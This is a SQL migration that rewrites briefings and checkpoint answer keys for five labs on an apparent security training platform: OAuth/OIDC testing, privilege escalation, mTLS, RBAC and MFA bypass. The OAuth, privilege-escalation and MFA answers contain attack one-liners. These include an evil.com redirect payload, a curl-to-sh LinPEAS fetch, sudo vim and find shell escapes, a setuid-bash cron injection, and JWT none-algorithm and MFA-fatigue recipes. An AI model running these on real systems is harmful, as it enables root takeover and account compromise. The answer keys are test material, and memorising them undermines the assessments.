-- Generated from prisma/lab-repair-batch-02.ts.
-- Existing lab and flag IDs are preserved so learner history remains intact.

UPDATE "Lab"
SET
  "description" = 'Complete OAuth 2.0 & OIDC Security Testing in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.',
  "dockerImage" = 'aeroacademy/ubuntu-practice:22.04',
  "briefing" = '### Mission Objective
Complete OAuth 2.0 & OIDC Security Testing in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.

### Runtime mode: portable artifact validation
This lab runs in a standard Ubuntu practice container. Work only inside `/home/student/lab-work`. External cloud accounts, host devices, nested container engines, desktop applications, and privileged cluster access are not required.

### Workflow
1. Add checkpoint 1, "Redirect Exploiter", to solution.md and build any supporting local artifact needed to explain or validate it.
2. Add checkpoint 2, "Code Thief", to solution.md and build any supporting local artifact needed to explain or validate it.
3. Add checkpoint 3, "PKCE Bypasser", to solution.md and build any supporting local artifact needed to explain or validate it.
4. Add checkpoint 4, "CSRF Attacker", to solution.md and build any supporting local artifact needed to explain or validate it.
5. Add checkpoint 5, "Token Forger", to solution.md and build any supporting local artifact needed to explain or validate it.

Create a `solution.md` file and document each checkpoint using the required canonical result shown with the checkpoint. You may create additional configuration or code files for practice. Checks remain deterministic after resets and on new deployments.',
  "tasks" = '["Add checkpoint 1, \"Redirect Exploiter\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 2, \"Code Thief\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 3, \"PKCE Bypasser\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 4, \"CSRF Attacker\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 5, \"Token Forger\", to solution.md and build any supporting local artifact needed to explain or validate it."]'::jsonb
WHERE "title" = 'OAuth 2.0 & OIDC Security Testing';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: redirect_uri=https://legit.com/callback@evil.com'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OAuth 2.0 & OIDC Security Testing'
)
AND "title" = 'Redirect Exploiter';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Intercept redirect with code parameter and replay'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OAuth 2.0 & OIDC Security Testing'
)
AND "title" = 'Code Thief';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Replay authorization code with different code_verifier'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OAuth 2.0 & OIDC Security Testing'
)
AND "title" = 'PKCE Bypasser';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Forge authorization request without state parameter'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OAuth 2.0 & OIDC Security Testing'
)
AND "title" = 'CSRF Attacker';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Modify JWT header to use none algorithm'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OAuth 2.0 & OIDC Security Testing'
)
AND "title" = 'Token Forger';

UPDATE "Lab"
SET
  "description" = 'Complete Privilege Escalation on Linux & Windows in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.',
  "dockerImage" = 'aeroacademy/ubuntu-practice:22.04',
  "briefing" = '### Mission Objective
Complete Privilege Escalation on Linux & Windows in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.

### Runtime mode: portable artifact validation
This lab runs in a standard Ubuntu practice container. Work only inside `/home/student/lab-work`. External cloud accounts, host devices, nested container engines, desktop applications, and privileged cluster access are not required.

### Workflow
1. Add checkpoint 1, "LinPEAS Runner", to solution.md and build any supporting local artifact needed to explain or validate it.
2. Add checkpoint 2, "SUID Exploiter", to solution.md and build any supporting local artifact needed to explain or validate it.
3. Add checkpoint 3, "Sudo Abuser", to solution.md and build any supporting local artifact needed to explain or validate it.
4. Add checkpoint 4, "Cron Exploiter", to solution.md and build any supporting local artifact needed to explain or validate it.
5. Add checkpoint 5, "GTFOBins User", to solution.md and build any supporting local artifact needed to explain or validate it.

Create a `solution.md` file and document each checkpoint using the required canonical result shown with the checkpoint. You may create additional configuration or code files for practice. Checks remain deterministic after resets and on new deployments.',
  "tasks" = '["Add checkpoint 1, \"LinPEAS Runner\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 2, \"SUID Exploiter\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 3, \"Sudo Abuser\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 4, \"Cron Exploiter\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 5, \"GTFOBins User\", to solution.md and build any supporting local artifact needed to explain or validate it."]'::jsonb
WHERE "title" = 'Privilege Escalation on Linux & Windows';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Privilege Escalation on Linux & Windows'
)
AND "title" = 'LinPEAS Runner';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: find / -perm -4000 -type f 2>/dev/null'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Privilege Escalation on Linux & Windows'
)
AND "title" = 'SUID Exploiter';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: sudo -l && sudo /usr/bin/vim -c '':!sh'''
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Privilege Escalation on Linux & Windows'
)
AND "title" = 'Sudo Abuser';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: echo ''chmod +s /bin/bash'' >> /opt/cron.sh'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Privilege Escalation on Linux & Windows'
)
AND "title" = 'Cron Exploiter';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: sudo find . -exec /bin/sh \; -quit'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Privilege Escalation on Linux & Windows'
)
AND "title" = 'GTFOBins User';

UPDATE "Lab"
SET
  "description" = 'Complete Certificate-Based Authentication (mTLS) in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.',
  "dockerImage" = 'aeroacademy/ubuntu-practice:22.04',
  "briefing" = '### Mission Objective
Complete Certificate-Based Authentication (mTLS) in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.

### Runtime mode: portable artifact validation
This lab runs in a standard Ubuntu practice container. Work only inside `/home/student/lab-work`. External cloud accounts, host devices, nested container engines, desktop applications, and privileged cluster access are not required.

### Workflow
1. Add checkpoint 1, "CA Creator", to solution.md and build any supporting local artifact needed to explain or validate it.
2. Add checkpoint 2, "Cert Issuer", to solution.md and build any supporting local artifact needed to explain or validate it.
3. Add checkpoint 3, "mTLS Configurer", to solution.md and build any supporting local artifact needed to explain or validate it.
4. Add checkpoint 4, "CRL Manager", to solution.md and build any supporting local artifact needed to explain or validate it.
5. Add checkpoint 5, "mTLS Tester", to solution.md and build any supporting local artifact needed to explain or validate it.

Create a `solution.md` file and document each checkpoint using the required canonical result shown with the checkpoint. You may create additional configuration or code files for practice. Checks remain deterministic after resets and on new deployments.',
  "tasks" = '["Add checkpoint 1, \"CA Creator\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 2, \"Cert Issuer\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 3, \"mTLS Configurer\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 4, \"CRL Manager\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 5, \"mTLS Tester\", to solution.md and build any supporting local artifact needed to explain or validate it."]'::jsonb
WHERE "title" = 'Certificate-Based Authentication (mTLS)';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650 -nodes'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Certificate-Based Authentication (mTLS)'
)
AND "title" = 'CA Creator';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: openssl req -new -newkey rsa:2048 -keyout client.key -out client.csr'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Certificate-Based Authentication (mTLS)'
)
AND "title" = 'Cert Issuer';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: ssl_client_certificate /etc/ssl/ca.crt; ssl_verify_client on;'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Certificate-Based Authentication (mTLS)'
)
AND "title" = 'mTLS Configurer';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: openssl ca -revoke client.crt && openssl ca -gencrl -out crl.pem'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Certificate-Based Authentication (mTLS)'
)
AND "title" = 'CRL Manager';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: curl --cert client.crt --key client.key --cacert ca.crt https://server/'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Certificate-Based Authentication (mTLS)'
)
AND "title" = 'mTLS Tester';

UPDATE "Lab"
SET
  "description" = 'Complete RBAC Design & Implementation in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.',
  "dockerImage" = 'aeroacademy/ubuntu-practice:22.04',
  "briefing" = '### Mission Objective
Complete RBAC Design & Implementation in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.

### Runtime mode: portable artifact validation
This lab runs in a standard Ubuntu practice container. Work only inside `/home/student/lab-work`. External cloud accounts, host devices, nested container engines, desktop applications, and privileged cluster access are not required.

### Workflow
1. Add checkpoint 1, "Model Designer", to solution.md and build any supporting local artifact needed to explain or validate it.
2. Add checkpoint 2, "Least Privilege", to solution.md and build any supporting local artifact needed to explain or validate it.
3. Add checkpoint 3, "Role Miner", to solution.md and build any supporting local artifact needed to explain or validate it.
4. Add checkpoint 4, "ABAC Extender", to solution.md and build any supporting local artifact needed to explain or validate it.
5. Add checkpoint 5, "Compliance Reporter", to solution.md and build any supporting local artifact needed to explain or validate it.

Create a `solution.md` file and document each checkpoint using the required canonical result shown with the checkpoint. You may create additional configuration or code files for practice. Checks remain deterministic after resets and on new deployments.',
  "tasks" = '["Add checkpoint 1, \"Model Designer\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 2, \"Least Privilege\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 3, \"Role Miner\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 4, \"ABAC Extender\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 5, \"Compliance Reporter\", to solution.md and build any supporting local artifact needed to explain or validate it."]'::jsonb
WHERE "title" = 'RBAC Design & Implementation';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Create role hierarchy: Admin > Manager > User with permission inheritance'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'RBAC Design & Implementation'
)
AND "title" = 'Model Designer';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: GRANT SELECT, INSERT ON table1 TO role_user_only;'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'RBAC Design & Implementation'
)
AND "title" = 'Least Privilege';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: SELECT role, COUNT(*) as perm_count FROM role_permissions GROUP BY role ORDER BY perm_count DESC;'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'RBAC Design & Implementation'
)
AND "title" = 'Role Miner';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: if (user.department == ''finance'' AND resource.classification == ''confidential'') { allow(); }'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'RBAC Design & Implementation'
)
AND "title" = 'ABAC Extender';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: SELECT user, role, last_access FROM user_roles LEFT JOIN access_logs;'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'RBAC Design & Implementation'
)
AND "title" = 'Compliance Reporter';

UPDATE "Lab"
SET
  "description" = 'Complete Multi-Factor Authentication Bypass & Hardening in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.',
  "dockerImage" = 'aeroacademy/ubuntu-practice:22.04',
  "briefing" = '### Mission Objective
Complete Multi-Factor Authentication Bypass & Hardening in a deterministic practice workspace without depending on unavailable host, cloud, hardware, desktop, or multi-node infrastructure.

### Runtime mode: portable artifact validation
This lab runs in a standard Ubuntu practice container. Work only inside `/home/student/lab-work`. External cloud accounts, host devices, nested container engines, desktop applications, and privileged cluster access are not required.

### Workflow
1. Add checkpoint 1, "SIM Swapper", to solution.md and build any supporting local artifact needed to explain or validate it.
2. Add checkpoint 2, "Fatigue Attacker", to solution.md and build any supporting local artifact needed to explain or validate it.
3. Add checkpoint 3, "TOTP Replayer", to solution.md and build any supporting local artifact needed to explain or validate it.
4. Add checkpoint 4, "Session Fixer", to solution.md and build any supporting local artifact needed to explain or validate it.
5. Add checkpoint 5, "Adaptive Enforcer", to solution.md and build any supporting local artifact needed to explain or validate it.

Create a `solution.md` file and document each checkpoint using the required canonical result shown with the checkpoint. You may create additional configuration or code files for practice. Checks remain deterministic after resets and on new deployments.',
  "tasks" = '["Add checkpoint 1, \"SIM Swapper\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 2, \"Fatigue Attacker\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 3, \"TOTP Replayer\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 4, \"Session Fixer\", to solution.md and build any supporting local artifact needed to explain or validate it.","Add checkpoint 5, \"Adaptive Enforcer\", to solution.md and build any supporting local artifact needed to explain or validate it."]'::jsonb
WHERE "title" = 'Multi-Factor Authentication Bypass & Hardening';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Intercept SMS OTP via SIM swap and replay within 30s window'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Multi-Factor Authentication Bypass & Hardening'
)
AND "title" = 'SIM Swapper';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Send repeated push notifications until user approves'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Multi-Factor Authentication Bypass & Hardening'
)
AND "title" = 'Fatigue Attacker';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Capture TOTP from browser and use within 30-second window'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Multi-Factor Authentication Bypass & Hardening'
)
AND "title" = 'TOTP Replayer';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: Set session cookie before authentication to skip MFA step'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Multi-Factor Authentication Bypass & Hardening'
)
AND "title" = 'Session Fixer';

UPDATE "LabFlag"
SET "description" = 'Document the canonical result for this checkpoint in solution.md. Required result: if (risk_score > 0.7) { require_mfa(); } else { skip_mfa(); }'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Multi-Factor Authentication Bypass & Hardening'
)
AND "title" = 'Adaptive Enforcer';
